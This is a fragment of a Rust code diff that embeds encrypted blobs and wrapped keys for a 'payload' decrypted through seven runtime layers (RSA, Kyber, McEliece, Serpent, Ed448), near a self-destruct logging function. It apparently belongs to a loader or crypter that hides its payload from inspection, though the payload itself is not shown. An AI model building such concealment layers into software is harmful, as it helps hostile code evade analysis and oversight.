@@ -25,12 +25,32 @@ fn log_self_destruct(msg: &str) {
     }
 }
 
-const PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.bin"));
+// Build-time embedded blobs for 7-layer runtime decryption
+const PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.bin")); // legacy, unused now
 const TS_BLOB: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/ts.bin"));
 const TS_PLAIN: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/ts_plain.bin"));
 const VM_PROG_BLOB: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/vmprog.bin"));
 const KM: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/km.bin"));
 const SALT: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/salt.bin"));
+
+// Layer 2: RSA-4096-OAEP
+const CT_RSA: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/ct_rsa.bin"));
+const RSA_SK_WRAP: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/rsa_sk_wrap.bin"));
+
+// Layer 3: Kyber-1024 (ML-KEM)
+const CT_KY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/ct_ky.bin"));
+const KY_SK_WRAP: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/ky_sk_wrap.bin"));
+
+// Layer 4: Classic McEliece-6960119f
+const CT_MCE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/ct_mce.bin"));
+const MCE_SK_WRAP: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/mce_sk_wrap.bin"));
+
+// Layer 5: Serpent-256-SIV
+const SIV_BLOB: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/serpent_siv.bin"));
+
+// Layer 6: Ed448
+const ED_VK: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/ed_vk.bin"));
+const ED_SIG: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/ed_sig.bin"));
 
 struct SecBuf {
     base: *mut u8,
